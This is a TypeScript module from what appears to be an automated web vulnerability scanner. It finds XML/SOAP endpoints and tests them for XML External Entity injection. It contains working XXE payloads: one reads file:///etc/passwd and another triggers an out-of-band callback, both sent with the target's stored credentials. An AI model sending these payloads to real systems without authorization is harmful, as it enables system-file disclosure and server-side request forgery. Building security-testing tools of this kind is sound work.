// XXE (XML External Entity) scanner (web2-vuln-classes SKILL).
//
// XXE is only testable where the target actually parses XML, so we first pick
// XML/SOAP-accepting endpoints out of the shared authenticated crawl (by path
// hint or a .xml URL — the corpus does not carry per-endpoint Content-Type).
// Then two techniques, both PROVEN only on direct evidence, never on a mere
// reflection of the payload or a status change:
//
//   1. OOB external entity — an external SYSTEM entity points at the Phase-5
//      OOB catcher's callback URL. A received callback (checkOobHit) proves the
//      parser resolved the entity and made the outbound request. -> CRITICAL.
//   2. Local file disclosure — an external SYSTEM entity points at
//      file:///etc/passwd; PROVEN only when the response contains the real file
//      content (the "root:...:0:0:" line), which the payload itself never
//      contains, so its presence proves entity expansion (same discipline as
//      the SSTI content-evaluation check). -> CRITICAL.
//
// If neither confirms but the endpoint clearly processes XML (parser error /
// SOAP fault / xml content-type) we record a CANDIDATE with a precise reason;
// otherwise nothing (no noise). GET requests are never used — XXE needs an XML
// body (POST). Capped per run, authenticated best-effort, and NEVER throws.

import type { ScanContext } from "./context";
import { logLine, recordFinding } from "./context";
import { probe, type ProbeResult } from "./http";
import { discoverCorpus } from "./discovery";
import { generateOobToken, checkOobHit } from "@/server/oob";
import { loadTargetCredentials, credentialHeaders } from "@/server/credentials";

const MAX_XML_ENDPOINTS = 10;
const MAX_OOB_ATTEMPTS = 5;
const OOB_WAIT_MS = 12_000;
const PROBE_TIMEOUT = 12_000;

// Path/query hints that an endpoint speaks XML/SOAP.
const XML_HINT_RE = /(\/soap\b|\/xmlrpc\b|\/xml-rpc\b|\/rpc\b|\/services\b|\/ws\b|\.asmx\b|\.wsdl\b|wsdl|soap|xml)/i;
// The /etc/passwd root line — NEVER present in the payload we send, so its
// presence in the response proves the external file entity was expanded.
const PASSWD_RE = /root:[^:]*:0:0:/;
// Signals the endpoint is actually running an XML parser (for CANDIDATE only).
const XML_PROC_RE =
  /(soap(?:env)?:fault|<\s*faultcode|not well-formed|org\.xml\.sax|lxml\.etree|xmlexception|DOCTYPE is not allowed|SAXParse|XML (?:parsing|declaration|document structures))/i;

function pathOf(url: string): string {
  try {
    const u = new URL(url);
    return u.pathname + u.search;
  } catch {
    return url;
  }
}

/** XML/SOAP-accepting endpoints from the corpus, deduped by origin+path, capped. */
function identifyXmlEndpoints(urls: string[]): string[] {
  const seen = new Set<string>();
  const out: string[] = [];
  for (const u of urls) {
    let parsed: URL;
    try {
      parsed = new URL(u);
    } catch {
      continue;
    }
    const hay = `${parsed.pathname}?${parsed.search}`;
    if (!XML_HINT_RE.test(hay) && !/\.xml$/i.test(parsed.pathname)) continue;
    const key = parsed.origin + parsed.pathname;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(u);
    if (out.length >= MAX_XML_ENDPOINTS) break;
  }
  return out;
}

/** POST an XML document; retry once as text/xml if the server rejects the type. */
async function postXml(
  url: string,
  xml: string,
  auth: Record<string, string>,
): Promise<ProbeResult> {
  let res = await probe(url, {
    method: "POST",
    headers: { ...auth, "Content-Type": "application/xml" },
    body: xml,
    timeoutMs: PROBE_TIMEOUT,
  });
  if (!res.error && res.status === 415) {
    res = await probe(url, {
      method: "POST",
      headers: { ...auth, "Content-Type": "text/xml" },
      body: xml,
      timeoutMs: PROBE_TIMEOUT,
    });
  }
  return res;
}

const FILE_PAYLOAD =
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
const oobPayload = (callbackUrl: string): string =>
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${callbackUrl}">]><foo>&xxe;</foo>`;

interface EndpointRec {
  endpoint: string;
  showsXml: boolean;
  token: string | null;
  injectedAt: number | null;
}

export async function runXxe(ctx: ScanContext): Promise<void> {
  await logLine(ctx.scanRunId, `[xxe] scanning ${ctx.baseUrl} for XML external entity injection`);

  const corpus = await discoverCorpus(ctx);
  if (!corpus.html) {
    await logLine(ctx.scanRunId, `[xxe] could not crawl ${ctx.baseUrl} — skipping`, "STDERR");
    return;
  }
  if (corpus.authenticated) {
    await logLine(ctx.scanRunId, `[xxe] using authenticated crawl (${corpus.urls.length} URLs)`);
  }

  const endpoints = identifyXmlEndpoints(corpus.urls);
  if (endpoints.length === 0) {
    await logLine(ctx.scanRunId, "[xxe] no XML-accepting endpoints found in corpus — skipping");
    return;
  }
  await logLine(ctx.scanRunId, `[xxe] ${endpoints.length} XML-accepting endpoint(s) to test`);

  // Authenticate the POSTs best-effort (reach session-gated XML endpoints).
  let auth: Record<string, string> = {};
  try {
    const creds = await loadTargetCredentials(ctx.targetId);
    if (creds.length > 0) auth = credentialHeaders(creds[0]);
  } catch {
    /* anonymous on failure */
  }

  const recs: EndpointRec[] = [];
  let oobAttempts = 0;

  for (const endpoint of endpoints) {
    // --- Technique 2: local file disclosure (PROVEN, no network wait). ---
    const fileRes = await postXml(endpoint, FILE_PAYLOAD, auth);
    if (!fileRes.error && PASSWD_RE.test(fileRes.body)) {
      const m = fileRes.body.match(PASSWD_RE);
      await recordFinding(ctx, {
        title: `XXE local file disclosure (/etc/passwd) @ ${pathOf(endpoint)}`,
        vulnClass: "XXE",
        severity: "CRITICAL",
        confidence: "PROVEN",
        location: endpoint,
        description:
          `The endpoint parses XML and expands an external SYSTEM entity pointing at ` +
          `file:///etc/passwd — the response contains the real contents of /etc/passwd ` +
          `(the "root:...:0:0:" line), not a reflection of the payload. This proves the XML ` +
          `parser resolves external entities: XXE here enables local file read, SSRF via ` +
          `other SYSTEM URIs, and often denial of service. Proven by distinctive file ` +
          `content in the response.`,
        evidence:
          `POST ${endpoint} (Content-Type: application/xml)\n` +
          `-> HTTP ${fileRes.status}, ${fileRes.bodyLen} bytes\n` +
          `matched /etc/passwd line: ${(m?.[0] ?? "").slice(0, 200)}`,
      });
      await logLine(ctx.scanRunId, `[xxe] PROVEN local file read @ ${pathOf(endpoint)}`);
      continue; // already proven for this endpoint — no OOB needed
    }

    const ct = (fileRes.headers["content-type"] ?? "").toLowerCase();
    const showsXml = /xml/.test(ct) || XML_PROC_RE.test(fileRes.body.slice(0, 1000));

    // --- Technique 1: OOB external entity (confirmed after the loop). ---
    let token: string | null = null;
    let injectedAt: number | null = null;
    if (oobAttempts < MAX_OOB_ATTEMPTS) {
      try {
        const minted = generateOobToken();
        injectedAt = Date.now();
        await postXml(endpoint, oobPayload(minted.callbackUrl), auth);
        token = minted.token;
        oobAttempts += 1;
      } catch {
        token = null;
        injectedAt = null;
      }
    }

    recs.push({ endpoint, showsXml, token, injectedAt });
  }

  // --- Fire-all-then-wait-once: a single wait covers every injected token. ---
  if (recs.some((r) => r.token !== null)) {
    await new Promise((resolve) => setTimeout(resolve, OOB_WAIT_MS));
  }

  for (const rec of recs) {
    let hit: { receivedAt: Date; sourceIp: string | null; method: string } | null = null;
    if (rec.token) {
      try {
        hit = await checkOobHit(rec.token);
      } catch {
        hit = null;
      }
    }

    if (hit) {
      const delaySec =
        rec.injectedAt != null
          ? ((hit.receivedAt.getTime() - rec.injectedAt) / 1000).toFixed(1)
          : "?";
      await recordFinding(ctx, {
        title: `XXE confirmed via OOB callback @ ${pathOf(rec.endpoint)}`,
        vulnClass: "XXE",
        severity: "CRITICAL",
        confidence: "PROVEN",
        location: rec.endpoint,
        oobToken: rec.token ?? undefined,
        description:
          `The endpoint parsed an XML document whose external SYSTEM entity pointed at the ` +
          `out-of-band catcher, and the catcher received the callback — proving the parser ` +
          `resolves external entities and makes attacker-directed outbound requests (blind ` +
          `XXE / SSRF). XXE here enables SSRF, local file read, and often DoS. Confirmed by ` +
          `the OOB interaction, not by any response reflection.`,
        evidence:
          `POST ${rec.endpoint} with an external-entity XML payload\n` +
          `OOB callback received ${delaySec}s later (method ${hit.method}` +
          `${hit.sourceIp ? `, source ${hit.sourceIp}` : ""}).`,
      });
      await logLine(ctx.scanRunId, `[xxe] PROVEN OOB XXE @ ${pathOf(rec.endpoint)} (${delaySec}s)`);
      continue;
    }

    // No proof. Record a CANDIDATE only when the endpoint clearly processes XML.
    if (rec.showsXml) {
      await recordFinding(ctx, {
        title: `Possible XXE — XML processing without confirmed entity expansion @ ${pathOf(rec.endpoint)}`,
        vulnClass: "XXE",
        severity: "MEDIUM",
        confidence: "CANDIDATE",
        location: rec.endpoint,
        description:
          `The endpoint parses XML (an XML parser error / SOAP fault / XML content-type was ` +
          `observed) but neither an external-entity file read (/etc/passwd) nor an OOB callback ` +
          `could be confirmed${rec.token ? "" : " (OOB attempt skipped — per-run cap reached)"}. ` +
          `External entity resolution may still be reachable via a different payload, element, ` +
          `or parameter — verify manually (try parameter entities, a DTD on a reachable host, ` +
          `and SOAP body injection).`,
        evidence: `POST ${rec.endpoint}: XML processing observed; no file content and no OOB callback.`,
      });
      await logLine(ctx.scanRunId, `[xxe] candidate (XML processing, unconfirmed) @ ${pathOf(rec.endpoint)}`);
    }
  }

  await logLine(ctx.scanRunId, "[xxe] done");
}
